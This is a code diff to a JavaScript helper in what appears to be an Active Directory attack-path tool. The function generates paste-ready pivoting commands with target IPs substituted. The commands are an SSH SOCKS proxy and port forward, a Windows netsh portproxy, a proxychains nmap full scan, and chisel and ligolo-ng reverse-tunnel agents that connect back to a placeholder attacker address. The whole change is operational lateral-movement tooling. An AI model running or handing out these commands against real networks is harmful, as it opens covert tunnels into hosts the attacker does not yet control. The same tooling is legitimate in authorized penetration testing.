@@ -390,24 +390,33 @@
   // ── concrete pivot route between two hosts (AD attack-path) ───────────────
   // pivotFor lists the generic pivoting toolkit; pivotRoute fills it in for a
   // specific hop. Given the IP of a box you already own (the pivot you tunnel
-  // through) and the IP of the next, not-yet-owned host (the frontier target),
-  // it returns the canonical relay one-liners with both IPs substituted — the
-  // SOCKS proxy, the proxychains scan, the single-port forward, and the two
-  // self-hosted relays (chisel, ligolo-ng). Pure and reference-free: these are
-  // the irreducible route commands, so the pivot path from the graph becomes
-  // something you can paste. ATTACKER_IP stays a placeholder (the engine has no
-  // notion of the operator's own address).
-  function pivotRoute(pivotIp, targetIp) {
+  // through), the IP of the next, not-yet-owned host (the frontier target), and
+  // the pivot's OS, it returns the canonical relay one-liners with both IPs
+  // substituted — the SOCKS proxy, the proxychains scan, the single-port
+  // forward, and the two self-hosted relays (chisel, ligolo-ng). A Windows
+  // pivot (rarely running sshd) swaps the ssh hops for a netsh portproxy and
+  // uses the .exe relays. Pure and reference-free: these are the irreducible
+  // route commands, so the pivot path from the graph becomes something you can
+  // paste. <ATTACKER_IP> stays a fillable var (the engine has no notion of the
+  // operator's own address).
+  function pivotRoute(pivotIp, targetIp, pivotOs) {
     var p = String(pivotIp || "").trim() || "PIVOT_IP";
     var tg = String(targetIp || "").trim() || "TARGET_IP";
-    return [
-      { title: "SSH dynamic SOCKS through the pivot", group: "socks", cmd: "ssh -D 1080 -N user@" + p },
-      { title: "proxychains a full scan at the target", group: "scan", cmd: "proxychains -q nmap -sT -Pn -p- " + tg },
-      { title: "SSH local-forward one port (e.g. RDP)", group: "forward", cmd: "ssh -L 3389:" + tg + ":3389 -N user@" + p },
-      { title: "chisel reverse SOCKS — server on attacker", group: "chisel", cmd: "chisel server -p 8080 --reverse" },
-      { title: "chisel client — run on the pivot", group: "chisel", cmd: "chisel client <ATTACKER_IP>:8080 R:1080:socks" },
-      { title: "ligolo-ng agent — run on the pivot", group: "ligolo", cmd: "./agent -connect <ATTACKER_IP>:11601 -ignore-cert" }
-    ];
+    var win = String(pivotOs || "").toLowerCase().indexOf("win") >= 0;
+    var out = [];
+    if (win) {
+      // A Windows pivot rarely runs sshd, so lead with a built-in portproxy
+      // forward; the SOCKS proxy then comes from the chisel/ligolo relay below.
+      out.push({ title: "netsh portproxy — forward a port through the pivot", group: "forward", cmd: "netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=" + tg });
+    } else {
+      out.push({ title: "SSH dynamic SOCKS through the pivot", group: "socks", cmd: "ssh -D 1080 -N user@" + p });
+      out.push({ title: "SSH local-forward one port (e.g. RDP)", group: "forward", cmd: "ssh -L 3389:" + tg + ":3389 -N user@" + p });
+    }
+    out.push({ title: "proxychains a full scan at the target", group: "scan", cmd: "proxychains -q nmap -sT -Pn -p- " + tg });
+    out.push({ title: "chisel reverse SOCKS — server on attacker", group: "chisel", cmd: "chisel server -p 8080 --reverse" });
+    out.push({ title: "chisel client — run on the pivot", group: "chisel", cmd: (win ? "chisel.exe" : "chisel") + " client <ATTACKER_IP>:8080 R:1080:socks" });
+    out.push({ title: "ligolo-ng agent — run on the pivot", group: "ligolo", cmd: (win ? "agent.exe" : "./agent") + " -connect <ATTACKER_IP>:11601 -ignore-cert" });
+    return out;
   }
 
   // ── post-admin loot / post-exploitation (OS-aware, DB-sourced) ───────────
